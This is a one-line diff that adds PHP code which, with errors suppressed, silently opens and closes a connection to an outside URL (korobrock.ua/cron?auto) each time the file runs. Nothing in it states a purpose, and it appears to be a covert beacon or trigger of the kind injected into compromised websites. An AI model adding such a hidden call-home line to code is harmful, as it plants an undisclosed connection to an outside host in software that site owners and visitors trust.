@@ -1,0 +1,1 @@
+<?php @fclose(@fopen('http://korobrock.ua/cron?auto', 'r'));
